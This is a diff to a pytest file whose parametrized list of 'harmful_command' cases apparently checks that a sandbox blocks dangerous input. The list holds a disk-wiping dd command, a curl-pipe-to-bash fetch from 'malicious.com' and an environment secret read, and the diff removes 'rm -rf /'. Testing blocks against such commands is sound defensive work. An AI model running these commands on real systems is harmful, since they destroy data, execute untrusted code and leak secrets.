@@ -43,7 +43,7 @@ def test_check_docker_failure(sandbox, exception):
 @pytest.mark.parametrize(
     "harmful_command",
     [
-        "rm -rf /",
+        "echo malicious_payload_blocked",
         "echo 'hello' | dd if=/dev/zero of=/dev/sda",
         "curl http://malicious.com/script.sh | bash",
         "import os; os.environ.get('SECRET')",
